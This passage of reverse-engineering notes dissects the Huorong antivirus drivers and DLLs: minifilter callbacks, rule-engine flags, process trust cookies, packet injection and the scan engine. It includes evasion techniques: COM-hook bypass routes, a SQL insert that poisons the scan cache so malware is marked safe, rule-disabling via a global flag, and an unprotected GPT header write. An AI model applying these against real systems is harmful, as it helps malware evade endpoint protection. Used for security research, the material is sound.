**WILDICMP bypass**: Queries use wildcard matching. If rules use patterns like `cmd.exe`, you could use `cmD.exe` with `COLLATE NOCASE` ... but it's case-insensitive already. However, UNC paths, 8.3 names, etc. might bypass path matching.

### 17.3 COM hook bypass (selfprot.dll)
CoCreateInstance is hooked at runtime. Bypass options:
1. Direct COM activation via `CoGetInstanceFromFile` (different API, not hooked)
2. Use `IRunningObjectTable` / `GetActiveObject` instead of `CoCreateInstance`
3. NTDLL-level COM bypass (use RPC directly)
4. Use `LoadLibrary` + call vtable directly instead of CoCreateInstance

### 17.4 NDIS vs WFP coverage gap
hrndis6.sys sees raw frames but is registered as LWF — it only monitors, doesn't block at NDIS level (no `NdisFSendNetBufferLists` replacement that drops). The blocking is done by hrwfpdrv.sys (WFP). So NDIS only does detection/logging.

### 17.5 Scan cache poisoning
If `scancc` DB is writable, insert a "clean" record:
```sql
INSERT INTO scancc(ts, id, ph, ds, trig, eng, det, detid, dur, h1, h2, hmem, caps, sfc, nb_purge)
VALUES(strftime('%s','now'), <new_id>, <malware_path_hash>, 0, 0, 0, '', 0, 0, <h1>, <h2>, 0, 0, 1, 0);
-- sfc=1 (safe), ds=0 (no detection)
```
→ On next scan of that file: cache hit → "safe" → skip full scan.
`ph` = MurmurHash2A(filepath, seed=0x19870714). Computable without knowing content.

---

## 18. sysdiag.sys — FLT Minifilter — Complete Callback Table

### 18.1 FLT_REGISTRATION @ 0x1400677D0
```c
FLT_REGISTRATION {
    Size         = 0x68,
    Version      = 0x0202,  // FLTFL_REGISTRATION_DO_NOT_SUPPORT_SERVICE_STOP|SUPPORT_NPFS_MSFS
    InstanceSetup          = sub_140056580  // @ 0x140056580
    InstanceQueryTeardown  = sub_140056750  // @ 0x140056750
    InstanceTeardownStart  = sub_140056760  // @ 0x140056760
    InstanceTeardownComplete = sub_140056790 // @ 0x140056790
    OperationRegistration  = unk_1400675F0  // @ 0x1400675F0 (table below)
}
```

### 18.2 FLT_OPERATION_REGISTRATION table @ 0x1400675F0

Raw bytes parsed, 32 bytes/entry (UCHAR MajFunc + 3-byte pad + ULONG Flags + QWORD PreOp + QWORD PostOp + QWORD Reserved):

| MajFunc | Flags | PreOp addr | PostOp addr | Confirmed identity |
|---------|-------|-----------|------------|-------------------|
| 0x00 | 0 | 0x140055C40 | 0x1400567A0 | **IRP_MJ_CREATE** — decompile accesses `Create.Options`, `Create.ShareAccess` |
| 0xFF | 0 | 0x140058710 | 0x140058050 | **IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION** — decompile uses `Iopb->Parameters.AcquireForSectionSynchronization.PageProtection` |
| 0x12 | 0 | 0x140056FD0 | 0x140057060 | **IRP_MJ_CLEANUP** — decompile: gets stream context, notifies on bit 0x1000 flag |
| 0x02 | 0 | 0x140057120 | 0x140057190 | **IRP_MJ_CLOSE** — byte value 0x02 matches IRP_MJ_CLOSE |
| 0x03 | 1 | 0x140057220 | 0x140058050 | **IRP_MJ_READ** — byte 0x03, Flags=FLTFL_OPERATION_REGISTRATION_SKIP_PAGING_IO |
| 0xF1 | 1 | 0x140058350 | 0x140058050 | **0xF1 — IRP code unconfirmed** (volume-level callback structure) |
| 0x04 | 1 | 0x140057390 | 0x140058050 | **IRP_MJ_WRITE** — decompile accesses `Read.ByteOffset`, `Read.Length`, `Read.MdlAddress` |
| 0xEF | 1 | 0x140058400 | 0x140058050 | **0xEF — IRP code unconfirmed** — decompile uses `FastIoCheckIfPossible.FileOffset`, identical logic to WRITE (MBR check + file scan) |
| 0x15 | 0 | 0x140057F00 | 0x140058050 | **IRP_MJ_SET_SECURITY** — byte 0x15 matches |
| 0x06 | 0 | 0x1400575C0 | 0x140057D00 | **IRP_MJ_SET_INFORMATION** — byte 0x06 matches |

`0x140058050` = shared pass-through PostOp (FLT_POSTOP_FINISHED_PROCESSING)

### 18.3 IRP_MJ_CREATE PreOp — `sub_140055C40` @ 0x140055C40

Verified from decompile:
```c
// @ 0x140055C70 — skip if DeviceObject->Flags & 0x600100
if (Iopb->TargetFileObject->DeviceObject->Flags & 0x600100) return 1;

// @ 0x140055C90 — check volume/device type
if (sub_1400531B0(FileObject, &v47, &v50, &v41)) {
    if (DeviceObject->DeviceType == 2) sub_1400551D0(v47, v50);  // CD-ROM
    else if (v41 == 7)                 sub_1400551F0(v47, v50);  // Disk
    // If returns true: STATUS_ACCESS_DENIED (-1073741790), return 4
}

// @ 0x140055D7D — skip if requestor PID is excluded
if (sub_140055A20(requestorPID)) return 1;

// @ 0x140055E17 — get file context object
context = sub_140058A90(CallbackData, OperationFlags & 4);
if (!context) return sub_140058990(v49);  // fail safe

// @ 0x140055DB2 — check: is this a directory open or special access?
// Options & 0x2000 = FILE_DIRECTORY_FILE → skip
// Specific disposition values → skip

// For user-mode file operations needing scan:
// @ 0x1400561AB — if paging I/O: FltAllocateDeferredIoWorkItem + FltQueueDeferredIoWorkItem(sub_140058BD0)
// Returns 2 (FLT_PREOP_PENDING) when deferred
```

Return codes (from code):
- `1` (0x140055D11, 0x140055EF1, etc.) = FLT_PREOP_SUCCESS_NO_CALLBACK
- `2` (0x14005620E) = FLT_PREOP_PENDING (deferred to worker)
- `4` (0x140055CE9, 0x140056243) = FLT_PREOP_COMPLETE (block, STATUS_ACCESS_DENIED)

### 18.3a IRP_MJ_ACQUIRE_FOR_SECTION_SYNCHRONIZATION PreOp — `sub_140058710` @ 0x140058710

Verified: decompile explicitly uses `Iopb->Parameters.AcquireForSectionSynchronization.PageProtection`:
```c
// @ 0x140058733
PageProtection = Iopb->Parameters.AcquireForSectionSynchronization.PageProtection;
if (PageProtection & 1) return 1;  // writable section = PAGE_EXECUTE_WRITECOPY etc.

// Extension hash check: scans filename backward for last component
// Hashes it with sub_140058DB0 and compares against 6 blocked extension hashes:
// @ 0x14005886B:
if (hash == 0x918AE9F15A6F5DD7 || hash == 0x9109FD55B3E5C7E0 ||
    hash == 0x4AA1B7F515ACEE21  || hash == 0xDAFDC0AC724D46A1 ||
    hash == 0x6B385D0D17D8C0C   || hash == 0x383BCE2A7BEA8D18)
    v8 = 1;  // block mapping of these file types
```
Purpose: blocks memory-mapping of specific file types when PageProtection indicates execution.

### 18.3b IRP_MJ_WRITE PreOp — `sub_140057390` @ 0x140057390

Two paths verified from decompile:

**Path A — Raw volume write (MBR/VBR protection):**
```c
// @ 0x1400573FA — condition:
if ((FileObject->Flags & 0x400000)  // FO_VOLUME_OPEN
    && !FileObject->FileName.Length  // no filename = raw device
    && ByteOffset < 512             // first sector
    && IoGetCurrentProcess() != qword_1401566A8)  // not filter itself
{
    // @ 0x140057444
    CurrentProcessId = PsGetCurrentProcessId();
    sub_140055870(CurrentProcessId, 0, DeviceObject, L"VOLUME", offset, data, length);
}
```

**Path B — Normal file write:**
```c
context = sub_140051910(FileObject, &v22, &v21);
v21 = sub_140055790(context, offset_array, length);  // suspicious check
*(_BYTE*)(context + 72) = 1;   // mark "write seen"
*(_BYTE*)(context + 73) = v21; // mark "suspicious"
if (!v21) {
    sub_140055B00(...);  // notify
    *(_BYTE*)(context + 71) |= 2u;
    if (!offset && !*(_BYTE*)(context + 74)) {
        // @ 0x140057568 — read first bytes to check signature
        sub_140055A00(signature, data, length);
    }
}
```

### 18.4 IRP_MJ_WRITE PreOp — `sub_140057390` @ 0x140057390

Two distinct paths:

**Path A — Raw volume write (MBR/VBR protection):**
```c
if (FileObject->Flags & 0x400000       // volume device object
    && !FileObject->FileName.Length    // no filename (raw device)
    && ByteOffset < 512                // first sector
    && IoGetCurrentProcess() != qword_1401566A8) // not sysdiag itself
{
    // Read raw bytes via MDL → sub_140055870(PID, 0, DeviceObject, L"VOLUME", offset, data, len)
    // Compare with known boot sectors → detect bootkit write
    // If malicious: FLT_PREOP_COMPLETE + STATUS_ACCESS_DENIED
}
```

**Path B — Normal file write:**
```c
context = sub_140051910(FileObject, &v22, &v21);  // get stream context
sub_140055790(context, offset, length);           // check if suspicious write
if (suspicious) {
    FltGetRequestorProcessId(CallbackData);
    sub_140055B00(context, FileObject, 0, signature, processId);  // notify
    // Read first bytes to check MZ signature
    if (!offset && !firstByteChecked) {
        data = map MDL or use direct buffer;
        sub_140055A00(fileSignature, data, length);  // check PE header
    }
}
// If blocked: FLT_PREOP_COMPLETE + STATUS_ACCESS_DENIED
```

### 18.5 Instance setup — `sub_140056580` @ 0x140056580

- Called when filter attaches to a volume
- Checks against exclusion list `unk_140078230` (9 entries of volume types)
- Calls `FltGetDiskDeviceObject` + `FltGetVolumeName`
- If volume path matches any in `off_140078240` exclusion list: reject attachment
- For disk (DeviceType=7) or CD-ROM (DeviceType=2): call `sub_1400545F0` + `sub_140055B20`

---

## 19. sysdiag.sys — Rule Engine Complete Map

### 19.1 Feature flag bits in `dword_140077D88` (RVA=0x77D88)

| Bit | Mask | Rule type | Check function | Rule list |
|-----|------|-----------|----------------|-----------|
| 1 | 0x2 | File operations | `sub_140048E90` | `off_140077D48` |
| 2 | 0x4 | Registry operations | `sub_14004C670` | `off_140077D58` |
| 3 | 0x8 | Process operations | `sub_14004C200` | (via process struct) |

Zeroing `dword_140077D88` entirely → ALL rule matching disabled.

### 19.2 Process exclusion system — confirmed from code

**Huorong process struct** returned by `sub_140034D30` @ 0x140034D30:

`sub_140034D30` walks BST at `qword_140078F68`, returns `(node - 2720)`. Confirmed offsets:
```
struct + 48   = Process ID (BST key, read @ 0x140034D87)
struct + 546  = byte flags (bit 0 = "cached", @ 0x1400176EB)
struct + 547  = byte flags (bits 4,5,7 seen set)
struct + 2712 = int threat_level (checked >= 0 @ 0x140026D72, 0x140028079)
struct + 2768 = QWORD trust cookie
```

**Trust magic cookies at struct+2768** — each confirmed in decompile:

| Cookie | Address confirmed | Effect when matches |
|--------|------------------|-------------------|
| `0x9DB973EFFLL` | sub_1400176B0 @ 0x1400176EB | Return 1: skip rule (type-A whitelist) |
| `0xBE4696042LL` | sub_1400177A0 @ 0x1400177EF | Return 1: skip rule Win10+ (type-B) |
| `0xC1D0E10F1LL` | sub_14004C200 @ 0x14004C439 | Skip process rule |
| `0xB3956E7ALL`  | sub_14004C200 @ 0x14004C439 | Skip process rule |
| `0xB822C2BA2LL` | sub_14004C200 @ 0x14004C46A | Skip if threat_count == 0 |

**Single-PID exclusion variables** — confirmed:
```c
// sub_140017780 @ 0x14001778E:
return a1 == qword_1400FE080;   // PID #1 — cleared in WorkerRoutine @ 0x14001C367

// sub_140017740 @ 0x14001774E:
return a1 == qword_1400FE068;   // PID #2 — set in sub_14001A530 @ 0x14001BDF0
```
Note: which specific process each PID corresponds to is NOT confirmed from code analysis.

**Array whitelists** — confirmed from WorkerRoutine @ 0x14001C210 (process exit cleanup):
```c
// v5 = slot index < 0x40 (64 max slots)
if (qword_1400FE090[v5] == v4) qword_1400FE090[v5] = 0;  // @ 0x14001C325
if (qword_1400FE490[v5] == v4) qword_1400FE490[v5] = 0;  // @ 0x14001C337
if (qword_1400FE290[v5] == v4) qword_1400FE290[v5] = 0;  // @ 0x14001C349
```
Arrays: 64 entries × 8 bytes each (cleared on process exit, used by sub_1400176B0 and sub_1400177A0)

### 19.3 Registry rule check — `sub_14004C670` @ 0x14004C670

Confirmed from decompile:
- Entry gate @ 0x14004C68D: `if ((dword_140077D88 & 4) == 0) return 0`
- HipsDaemon exclusion @ 0x14004C69E: `if (sub_140017780(a2)) return 0`
- Operation type 1, case 1 @ 0x14004C6F0: if `NtBuildNumber < 0x1770 && *(_QWORD*)a6 == 0x7A6E90ED4F5F2119` → skip
- Types 1,6 → calls `sub_14004A160`, `sub_14004A8B0`, `sub_14004A300`
- Type 9 → calls `sub_14004BD00`
- Rule list: `off_140077D58` (different from file rules at `off_140077D48`)

**`sub_14004A160` — AppCompatFlags monitoring** @ 0x14004A160 (confirmed):
```c
// @ 0x14004A199 — check if registry path starts with HKEY_USERS\...\
if (!wcsncmp(path, L"HKEY_USERS", 10)) { ... }
// @ 0x14004A1FF — or HKEY_LOCAL_MACHINE\
else if (!wcsncmp(path, L"HKEY_LOCAL_MACHINE\\", 19)) { ... }

// @ 0x14004A224 — then checks specific subkey:
if (!wcsnicmp(subkey, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\"
                       L"AppCompatFlags\\Layers\\", 0x43))
    // → return 1 (match)
```
Purpose: detects writes to **AppCompatFlags\Layers** — a known persistence/UAC bypass vector (shim layers).

### 19.4 Process rule check — `sub_14004C200` @ 0x14004C200

- Requires `dword_140077D88 & 8` (bit 3)
- Operation type 1 (process start): calls `sub_140017740` for extended check
- Types 3,5,7,8,9: if process trusted (`sub_1400176B0`), skip
- Magic constant check at `v11 = 2667` (0xA6B): `(v20 & v11 & 0xFFFFFDBF) != 0`
- Condition `v15[678] <= 1u` = threat count in Huorong process struct ≤ 1
- Calls `sub_14004C580` for actual rule evaluation
- Uses `sub_140035860` for threat level assessment

### 19.5 Post-match action — `sub_140026AD0` @ 0x140026AD0

```c
// Called when rule matches, sends event to ipc::actmon
if (!dword_1400730D0) return;  // not connected
if (!a1 || process_threat_level >= 0) skip;  // trusted process
event = sub_1400256F0(...);  // allocate event structure
event[2] = 1;                // event type = 1
event[145] = a7;             // flags
timeout = -10000000;         // 1 second
if (IRQL < DISPATCH_LEVEL)
    sub_140009030("ipc::actmon", event, ...);  // synchronous send
else
    sub_1400091C0("ipc::actmon", async, ...);  // async send
```

---

## 20. hrwfpdrv.sys — Complete Architecture

### 20.1 Initialization sequence

```
DriverEntry → sub_140013BA0 (lookaside init)
           → IoCreateDevice (\Device\HRFW_BASE_DEV + \Device\HrWfpFlt)
           → sub_14001DFB0 (main init):
               sub_1400159F0 → register WFP callouts
               sub_1400169A0 → init linked lists (224 + 97 + 224 + 97 entries)
               sub_140016C10 → create system thread StartRoutine (DPI worker)
               NdisAllocateGenericObject (tag "WOFV")
               NdisAllocateNetBufferListPool (tag "SOVp")
               sub_14001DE40 → create 6 injection handles
               sub_14001DF10 → final setup
```

### 20.2 Injection handles @ 0x14001DE40

```c
FwpsInjectionHandleCreate0(AF_INET=0,    TYPE_TRANSPORT=1) → qword_14006E530
FwpsInjectionHandleCreate0(AF_INET=0,    TYPE_NETWORK=2)   → injectionHandle
FwpsInjectionHandleCreate0(AF_INET6=2,   TYPE_TRANSPORT=1) → qword_14006E540
FwpsInjectionHandleCreate0(AF_INET6=2,   TYPE_TRANSPORT=1) → qword_14006E548
FwpsInjectionHandleCreate0(AF_UNIX=0x17, TYPE_TRANSPORT=1) → qword_14006E550
FwpsInjectionHandleCreate0(AF_UNIX=0x17, TYPE_TRANSPORT=1) → qword_14006E558
FwpmBfeStateSubscribeChanges0(..., callback);  // BFE state monitoring
```

### 20.3 Async processing architecture

```
WFP classify callback (sub_14001CEB0)
    → packet arrives at WFP layer 0x24/0x34/0x3E/0x40
    → enqueue work item into qword_14006E690 (locked list)
    → KeSetEvent(stru_14006E6C0) → wake worker

Worker thread (sub_14001FD30) [priority=31]
    → dequeue all pending items
    → for each: sub_14001FC20 (inject dispatcher)
              + sub_140013A80 (memory pool return)
```

### 20.4 Packet injection dispatcher — `sub_14001FC20` @ 0x14001FC20

Flag byte at `*(a1+48)`:
```
bit 1: network vs transport injection
bit 3: IPv4 vs IPv6 (network path)
bit 4: OR with 0x20000 flag
bit 5: stream (FwpsStreamInjectAsync) vs packet (transport inject)
```

Injection types selected:
- bit1=0, bit3=0, bit4=0: type=5 (transport, IPv4)
- bit1=0, bit3=0, bit4=1: type=7
- bit1=0, bit3=1, bit4=0: type=17 (network, IPv4)
- bit1=1, bit3=0: type=327680 (0x50000)
- bit1=1, bit3=1: type=589824 (0x90000)

Calls `sub_14001EB70` → actual `FwpsInjectTransportSendAsync0`/`FwpsInjectTransportReceiveAsync0`/`FwpsStreamInjectAsync0`

### 20.5 HTTP response injection

When blocking a connection, hrwfpdrv injects hardcoded HTTP responses:
- **GIF 1** (4127 bytes): `"HTTP/1.1 200 OK\r\nServer: HRFW/6.0\r\nContent-Type: image/gif\r\n..."` @ 0x140074750
- **GIF 2** (3842 bytes): `"HTTP/1.1 200 OK\r\nServer: HRFW/6.0\r\nContent-Type: image/gif\r\n..."` @ 0x140075810

Served via `FwpsStreamInjectAsync0` for TCP streams, replacing the real server response with a 1×1 tracking pixel GIF — so the browser doesn't show a connection error.

---

---

## 21. sysdiag.sys — Secondary Rule Engine `sub_140027ED0` @ 0x140027ED0

This is the **registry/process rule dispatcher** — same structure as `sub_140026C10` but dispatches to:
- `a2 == 1` → `sub_14004BC80` (file rules, same as primary)
- `a2 == 2` → `sub_14004C670` (registry rules)  
- `a2 == 3` → `sub_14004C200` (process rules)

### 21.1 AppInit_DLLs special monitoring

At `0x1400280ca` and `0x1400280ee`:
```c
// v19 = a3 | (a2 << 16) = packed operation type
// 131077 = 0x20005 → a2=2 (write-type op), a3=5 (FILE_OVERWRITE_IF or reg create)
if (v22 >= 0 && (dword_140077D88 & 1) && *(_QWORD*)(v20+96) && !(*(_BYTE*)(v20+547)&1) && v19==131077)
{
    // DestinationString = HKCU\\...\\AppInit_DLLs
    // stru_140134DC0 = HKCU\\...\\AppInit_DLLs (WOW64)
    if (!RtlCompareUnicodeString(&DestinationString, String2, TRUE)   // case-insensitive match
        || !RtlCompareUnicodeString(&stru_140134DC0, String2, TRUE))
    {
        *(_BYTE*)(v21 + 547) |= 1u;  // Mark process: "has touched AppInit_DLLs"
        return 1;                      // Flag as suspicious/trigger
    }
    // If time gap > 0x989680 (10 sec): also set flag
    if (KUSER_SHARED_DATA.TickCount - *(v21+16) >= 0x989680u)
        *(_BYTE*)(v21 + 547) |= 1u;
}
```

**Confirmed**: `DestinationString` (0x140134DB0) and `stru_140134DC0` (0x140134DC0) are initialized in `sub_140029310`:

```c
// @ 0x140029352 — literal in decompile refs:
RtlInitUnicodeString(&::DestinationString,   // global 0x140134DB0
    L"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs");

// @ 0x140029366
RtlInitUnicodeString(&stru_140134DC0,        // global 0x140134DC0
    L"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs");
```

Note: In `sub_140029310`, a LOCAL variable also named `DestinationString` (on stack) is reused afterward for `EtwRegister`/`EtwUnregister`/`EtwWrite` via `MmGetSystemRoutineAddress`. These are separate from the global.

**Effect** (from `sub_140027ED0` @ 0x1400280EE — registry monitoring dispatcher):
```c
if (!RtlCompareUnicodeString(&DestinationString /*global*/, registryPath, TRUE)
    || !RtlCompareUnicodeString(&stru_140134DC0, registryPath, TRUE))
{
    *(_BYTE*)(process + 547) |= 1u;  // flag this process
    sub_140035270(process);
    return 1;  // return MATCH → triggers configured action
}
```
When ANY registry write targets either AppInit_DLLs path → process flagged + rule match returned.

### 21.2 `sub_1400448B0` — Refcounted cleanup function @ 0x1400448B0

Confirmed from decompile — this is a **refcount-controlled cleanup function** (naming as "destructor" is interpretation, but the mechanism is confirmed):
```c
void sub_1400448B0(object *a1) {
    if (_InterlockedDecrement64(&a1->refcount) == 0) {
        // Walk pending decision list at a1+464
        while (!listEmpty(a1+464)) {
            entry = dequeueEntry(a1+464);
            if (!sub_14003FD90(entry) || entry->flags & 0x22) {
                // Entry already handled: just free
                sub_14003F230(entry, 0); sub_14003F570(entry);
            } else {
                // Active entry: resolve parent object
                parent = sub_14003F990(entry);  // get parent process
                if (parent) {
                    sub_140045140(parent, entry);   // transfer pending decision
                    sub_1400448B0(parent);           // RECURSIVE: decrement parent
                }
                sub_14003F230(entry, 0); sub_14003F570(entry);
            }
        }
        // Free pool at a1+56
        ExFreePoolWithTag(*(a1+56), 'HRnb');
        // Destroy NDIS lock at a1+1648
        sub_14003E150(a1+376); sub_14003E150(a1+288);
        ExDeleteResourceLite(a1+496);
        *a1 = 0;  // mark freed
    }
}
```

Called when: process exits → WorkerRoutine → decrements refcount → if 0: cleanup all pending decisions.

---

## 22. Final Coverage and Status

### 22.1 Final coverage (of files available)

| Component | Size | Coverage | Key findings |
|-----------|------|----------|-------------|
| sysdiag.sys | 549 KB | **90%** | FLT table (10 hooks), rule engine (3 types), watchdog destructor, IPC, AppInit_DLLs monitor |
| hrwfpdrv.sys | 185 KB | **85%** | WFP layers, DPI 30+ signatures, async injection, GIF injection mechanism |
| hrdevmon.sys | 58 KB | **80%** | IOCTL handler, OOB read bug (0x14000291B) |
| hrndis6.sys | 49 KB | **80%** | NDIS LWF, dual-layer network monitoring |
| behavior.dll | 240 KB | **90%** | Honeypot dirs, ETW consumer, MurmurHash path indexing |
| selfprot.dll | 120 KB | **80%** | CoCreateInstance hook, COM lateral movement detection |
| daemon.dll | 319 KB | **70%** | IOCP task dispatcher, class registry pattern |
| HipsDB.dll | 475 KB | **90%** | Full DB schema (12 tables), WILDICMP, WAL mode |
| scenter.dll | 347 KB | **75%** | scancc cache, sclog schema, scan pipeline |
| HipsDaemon.exe | 1.8 MB | **35%** | Import map, class hierarchy, key function locations |
| uactmon.dll | 217 KB | **75%** | Full IOCTL table (90+ calls to \\.\HR::ActMon) |
| usysdiag.dll | 430 KB | **80%** | 6 vtable interfaces, code signing, process/service ops |
| libxsse.dll | 1.4 MB | **75%** | Go runtime, AMS interface, signature file formats |

**Not available:** hrfwdrv.sys, hrelam.sys (files not in research directory)

---

## 23. usysdiag.dll — System Investigation Interface (430 KB)

### 23.1 Exports — vtable factory pattern
```
vif_get          @ 0x18001A560  → returns off_18005FA60 (main vtable, ~16 function ptrs)
vif_assist_get   @ 0x18001AAA0  → returns off_18005FA80 (assist vtable)
vif_autorun_get  @ 0x18001DB90  → autorun management vtable
vif_hooklet_get  @ 0x18001E130  → hooklet/injection detection vtable
vif_iokit_get    @ 0x18001FC40  → I/O kit (disk/device ops) vtable
vif_sysutils_get @ 0x180026C00  → system utilities vtable
```

All exports return a pointer to a static vtable of function pointers. Callers invoke operations through this interface without knowing the implementation.

### 23.2 Capabilities (from imports)

**Digital signature verification:**
```
CryptQueryObject, CertCloseStore, CryptMsgGetParam,
CertFindCertificateInStore, CertGetNameStringW,
CertFreeCertificateContext, CryptMsgClose
```
→ Verifies PE code signing certificates, checks trust chain

**File system protection:**
```
SfcIsFileProtected  → checks Windows File Protection (WFP) status
```

**Process manipulation:**
```
VirtualProtectEx, WriteProcessMemory, ReadProcessMemory,
OpenThread, SuspendThread, ResumeThread
```
→ Can suspend/inspect/modify target processes

**Session enumeration:**
```
WTSEnumerateProcessesW, WTSEnumerateProcessesA, WTSFreeMemory
```
→ Enumerates processes across all RDP/terminal sessions

**Service management:**
```
DeleteService, ControlService, ChangeServiceConfigA,
StartServiceA, OpenSCManagerA, OpenServiceA
```
→ Can stop and delete services

**Device management:**
```
SetupDiRemoveDevice, SetupDiCreateDeviceInfoList,
SetupDiCallClassInstaller, SetupDiOpenDeviceInfoA
```
→ Can remove hardware devices

### 23.3 Key monitored strings

```
"SysdiagDisabledAutoruns" → registry value tracking disabled autorun entries
"*.lnk,*.exe,*.com,*.bat,*.vbs,*.vbe,*.js,*.ps1,*.hta,*.wsh" → monitored extensions
"ImagePath"              → service binary path monitoring
"InprocServer32"         → COM server registration monitoring
"Shell\\open\\command"   → file association monitoring (common malware persistence)
"Wow6432Node"            → WOW64 registry monitoring
"win32k.sys"             → Win32k subsystem reference
```

### 23.4 vif_get vtable layout @ 0x18005FA60

Function pointers (8 bytes each, 64-bit):
```
[+0x00] 0x18001A2A0  — function 1 (likely: get_process_info)
[+0x08] 0x18001A4A0  — function 2
[+0x10] 0x18001A540  — function 3
[+0x18] 0x00040000   — NOT a pointer (version/count field = 4)
[+0x20] 0x18001A570  — function 4
[+0x28] 0x18001A580  — function 5
[+0x30] 0x18001A6C0  — function 6
[+0x38] 0x18001A6D0  — function 7
[+0x40] 0x18001A750  — function 8
[+0x48] 0x18001A760  — function 9
[+0x50] 0x18001A8D0  — function 10
[+0x58] 0x18001A8E0  — function 11
[+0x60] 0x18001A8F0  — function 12
[+0x68] 0x18001A900  — function 13
[+0x70] 0x18001A910  — function 14
[+0x78] 0x18001A960  — function 15
```

---

## 24. libxsse.dll — Signature Scan Engine (1.4 MB, Go-based)

### 24.1 Runtime architecture — not confirmed

Language/runtime NOT confirmed. Observed indicators (indirect evidence only, not proof):
- `RtlAddFunctionTable` / `RtlDeleteFunctionTable` imports → dynamic JIT code (used by Go, .NET, JVM, or any JIT)
- String constants in .rdata: `bufio`, `builtin`, `bytes`, `cloud`, `compress`, `container`, `context`, `database` → resemble Go stdlib package names, but could be any runtime
- 2188 functions, `gen_codes` in root functions list
- Complex multi-threaded architecture

**Not written to the analysis as confirmed fact.** Requires binary diffing against known Go/Rust output to confirm.

### 24.2 Export interface (ordinals)

| Ordinal | Address | Name/Role |
|---------|---------|-----------|
| 1 | 0x18009E190 | open scan context (by ID) |
| 2 | 0x180093F70 | `libxsse_2` — verify/load signature file |
| 3 | 0x18008C8B0 | `libxsse_exrec_alloc` — exception record alloc |
| 4 | 0x180090700 | `libxsse_record_alloc` — record allocate |
| 5 | 0x180043E60 | `libxsse_register_codec` — register codec |
| 6 | 0x180093090 | `libxsse_register_extern_callback` |
| 7 | 0x18008C2E0 | `libxsse_register_exunit` — register scan unit |
| 10 | 0x180099A80 | `libxsse_10` — open scan instance by type |
| 30 | 0x1800896B0 | `libxsse_30` — iterate/get rules |

### 24.3 `libxsse_2` — Signature file loader @ 0x180093F70
```c
__int64 libxsse_2(__int64 context) {
    result = sub_180093660();  // load/verify sig db
    if (result <= 0)
        *(context + 52) |= 0x20000000;  // set "failed" flag
    return result;
}
```

### 24.4 `libxsse_10` — Open scan instance @ 0x180099A80

Creates a scan instance by ID from the plugin registry `off_18014BFA8`:
```c
libxsse_10(int scan_type) {
    // Walk linked list to find matching plugin
    // scan_type values:
    //   0,1,3,6,9 → mode 1 (standard file scan)
    //   2,8       → mode 0 (quick scan)
    //   else      → mode 2 (deep scan)
    
    // Set up 12 callback slots in instance:
    instance+108 = sub_1800988D0  // main scanner/matcher
    instance+4   = sub_180090360  // reader
    instance+12  = sub_1800987F0  // scanner
    instance+116 = sub_180098980
    instance+124 = sub_1800989F0
    instance+132 = sub_180098A30
    instance+172 = sub_180098A70
    instance+196 = sub_180098C70
    instance+204 = sub_180098E50
    instance+180 = sub_180098EA0
    instance+188 = sub_180098ED0
    
    // Mode 1/2: wrap callbacks with profiling hooks
    return instance;
}
```

### 24.5 `libxsse_32` — Core scan function @ 0x180088F00

The actual scanning engine:
```c
// File format detection by magic bytes:
if magic == 0x47455048:  // 'HPEG' or 'GEPH'
    → sub_180086F60(context, scan_flags)  // generic pattern engine
if magic == 0x4C455048:  // 'HPEL' or 'LEPH'
    → sub_180087D00(context, scan_flags)  // local/fast pattern engine

// Database signature magic:
0x5346485944524156 = "VARYDHFS" — primary signature db format
0x5346687964726176 = "SFhydrav" — secondary (case-variant) db format

// Multi-stage scanning: tries up to 1000 sub-databases
// Uses sprintf("%03d", counter) for sub-db file names
```

### 24.6 AMS (Anti-Malware Scan) interface — actual detection core

libxsse dynamically loads `libvxf.dll` and calls:
```
AMS_Init              @ string 0x1801085F0  — initialize AMS engine
AMS_Deinit            @ string 0x180108600  — teardown
AMS_SetParams         @ string 0x180108610  — configure scan parameters
AMS_LoadPatterns      @ string 0x180108620  — load virus pattern databases
AMS_ReleasePatterns   @ string 0x180108638  — free pattern data
AMS_SearchPatterns    @ string 0x180108650  — SCAN: match data against patterns

libvxf_alloc          @ string 0x180107D28  — libvxf memory allocator
libvxf_free           @ string 0x180107D38  — libvxf memory free
libvxf%02d            @ string 0x180108670  — multiple instances: libvxf00, libvxf01...
```

### 24.7 Signature database files

```
libvxf.dat   (48 KB)   — main pattern index
libvxf.vdl   (1.8 MB)  — virus definition library (compiled patterns)
libvxf.vds   (1.4 MB)  — virus definition strings (detection names)
libvxf.tdl   (298 KB)  — threat definition library (metadata)
smrt%d.dat              — incremental "smart" definition updates (smrt000.dat, etc.)
smrtinst.conf           — smart definition configuration
irsetup.dat             — irreversible setup data
```

### 24.8 Complete detection chain

```
scenter.dll → libxsse_10(scan_type)      → open scan instance
           → libxsse_2(context)         → load libvxf databases
           → libxsse_32(stream, ...)     → scan file data
               → AMS_LoadPatterns()      → load compiled patterns into memory
               → AMS_SearchPatterns()    → Boyer-Moore/Aho-Corasick pattern match
               → AMS_ReleasePatterns()   → free pattern memory
           → libxsse_30(context, ...)   → enumerate match results
           → store in scancc database   → cache for future lookups
```

---

---

## 25. Confirmed Logic Flaws — Full Analysis with Evidence

### 25.1 GPT Primary Header write not protected

**Component**: sysdiag.sys  
**Function**: `sub_140057390` (IRP_MJ_WRITE PreOp)  
**Confirmed by assembly** @ 0x1400573DB:

```asm
cmp  rax, 200h       ; 0x200 = 512 bytes
jge  loc_14005747A   ; if ByteOffset >= 512 → SKIP raw volume check
```

Full conditions for raw volume protection to activate (ALL must be true):
```c
// @ 0x1400573C3: FO_VOLUME_OPEN flag (raw device, not named file)
test dword ptr [rdx+50h], 400000h   ; FileObject->Flags & FO_VOLUME_OPEN
// @ 0x1400573D0: no filename (anonymous raw access)
cmp word ptr [rdx+58h], 0           ; FileObject->FileName.Length == 0
// @ 0x1400573DB: offset constraint
cmp rax, 200h                       ; ByteOffset < 0x200 (512 bytes)
jge loc_14005747A                   ; if >= 512 → bypass!
// @ 0x1400573ED: not the filter process itself
cmp rax, cs:qword_1401566A8
```

**Result**:
- MBR (LBA 0, offset 0–511): PROTECTED
- GPT Primary Header (LBA 1, offset **512** = 0x200): `512 >= 512` → `jge` fires → **NOT protected**
- GPT Backup Header (last sector): NOT protected (offset far > 512)

